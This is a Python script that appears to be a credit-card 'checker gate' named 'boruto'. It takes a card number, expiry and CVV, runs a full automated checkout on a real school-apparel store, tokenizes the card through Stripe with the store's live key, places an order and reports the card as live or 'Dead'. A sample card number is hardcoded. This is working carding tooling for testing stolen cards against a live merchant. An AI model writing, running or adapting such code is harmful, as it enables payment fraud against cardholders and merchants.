import sys
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
import asyncio
import httpx
import time
import json
import re

def capture(text, start, end):
    try:
        s = text.split(start, 1)[1]
        return s.split(end, 1)[0]
    except Exception:
        return None

async def test_boruto_direct(card_str):
    cc, month, year, cvv = [p.strip() for p in card_str.split('|')[:4]]
    if len(year) == 2:
        year = "20" + year
    month = month.zfill(2)

    headers_base = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    }

    async with httpx.AsyncClient(follow_redirects=True, verify=False, timeout=30.0) as session:
        print("[*] Step 1: Visiting Product Page...")
        r1 = await session.get(
            "https://prepsportswear.com/school/us/new-york/accord/kerhonkson-elementary-school-ganders/product/fruit-of-the-loom-mens-5oz-cotton-t-shirt?productid=5078&schoolid=167239",
            headers=headers_base
        )
        print(f"    Product Page Status: {r1.status_code}")

        print("[*] Step 2: Adding to Cart...")
        h2 = {
            **headers_base,
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Origin": "https://prepsportswear.com",
            "Referer": "https://prepsportswear.com/school/us/new-york/accord/kerhonkson-elementary-school-ganders/product/fruit-of-the-loom-mens-5oz-cotton-t-shirt?productid=5078&schoolid=167239",
        }
        p2 = {
            "Activity": {"Name": "Ganders", "Tag": "M", "Group": "Mascot"},
            "Color": "royal",
            "Personalization": {"playerName": "", "playerNumber": "", "classYear": "2024"},
            "ProductID": 5078,
            "ProductSize": "Small",
            "Price": 27.99,
            "Quantity": 1,
            "SchoolID": 167239,
            "CartLineItemImageUrl": "",
            "CartLineItemDesigns": [
                {"PrintableArea": "Full Front", "DesignID": 51001, "Color1": "F8F8F8"},
                {"PrintableArea": "Full Back", "DesignID": 46259, "Color1": "F8F8F8"},
            ],
        }
        r2 = await session.post("https://prepsportswear.com/api/cart/items?=", headers=h2, json=p2)
        print(f"    Add to Cart Status: {r2.status_code} | Body: {r2.text[:100]}")

        print("[*] Step 3: Updating Shipping Address...")
        h3 = {
            **headers_base,
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Origin": "https://prepsportswear.com",
            "Referer": "https://prepsportswear.com/checkout/shippingandbilling",
        }
        p3 = {
            "shippingAddress": {
                "FirstName": "John",
                "LastName": "Doe",
                "StreetAddress": "118 W 132nd St",
                "StreetAddress2": "",
                "ShowStreetAddress2": False,
                "City": "New York",
                "State": "NY",
                "ZipCode": "10027",
                "CityStateZipCode": "New York NY 10027",
                "CountryCode": "US",
                "Country": "United States",
                "ZipCodePlaceHolder": "Zip Code",
                "subscCol": {},
            }
        }
        r3 = await session.post("https://prepsportswear.com/api/ps/checkout/UpdateShippingAddress?=", headers=h3, json=p3)
        print(f"    Shipping Update Status: {r3.status_code} | Body: {r3.text[:100]}")

        print("[*] Step 4: Tokenizing on Stripe...")
        h4 = {
            **headers_base,
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
        }
        p4 = f"card[name]=John+Doe&card[address_line1]=118+W+132nd+St&card[address_line2]=&card[address_city]=New+York&card[address_state]=NY&card[address_zip]=10027&card[number]={cc}&card[exp_month]={month}&card[exp_year]={year}&card[cvc]={cvv}&email=johndoe9981%40gmail.com&key=pk_live_7xS0ogDNa9kobWGvCMA0pLsZ"
        r4 = await session.post("https://api.stripe.com/v1/tokens", headers=h4, data=p4)
        t4 = r4.json()
        tok = t4.get("id")
        print(f"    Stripe Token: {tok}")

        if not tok:
            print(f"    Stripe Error: {t4}")
            return "Dead! ❌", "Tokenization Failed"

        print("[*] Step 5: Submitting Order...")
        p5 = {
            "BillingCard": True,
            "BillingCity": "New York",
            "BillingCountry": "United States",
            "BillingEmailAddress": "johndoe9981@gmail.com",
            "BillingEmailAddressConfirm": "johndoe9981@gmail.com",
            "BillingFirstName": "John",
            "BillingLastName": "Doe",
            "BillingPhone": "2125551234",
            "BillingState": "NY",
            "BillingStreetAddress2": "",
            "BillingStreetAddress": "118 W 132nd St",
            "BillingZipCode": "10027",
            "IsSubscription": False,
            "IsSMSSubscription": False,
            "SameAsShipping": True,
            "ShippingCity": "New York",
            "ShippingCountry": "United States",
            "ShippingFirstName": "John",
            "ShippingLastName": "Doe",
            "ShippingState": "NY",
            "ShippingStreetAddress2": "",
            "ShippingStreetAddress": "118 W 132nd St",
            "ShippingZipCode": "10027",
            "StripeTokenId": f"{tok}",
        }
        r5 = await session.post("https://prepsportswear.com/api/orders?=", headers=h3, json=p5)
        print(f"    Order Submission Status: {r5.status_code}")
        print(f"    Raw Order Response: {r5.text}")

        t5 = r5.text
        st = capture(t5, '"success":', ",")
        msg = capture(t5, '"Value":"', '"')
        return st, msg

if __name__ == '__main__':
    test_c = sys.argv[1] if len(sys.argv) > 1 else '4033060047342909|08|28|667'
    print(f"=== TESTING BORUTO.PY GATE ON {test_c} ===")
    start = time.time()
    st, msg = asyncio.run(test_boruto_direct(test_c))
    elapsed = round(time.time() - start, 2)
    print(f"\nFinal Verdict: Status={st} | Message={msg} | Elapsed={elapsed}s")
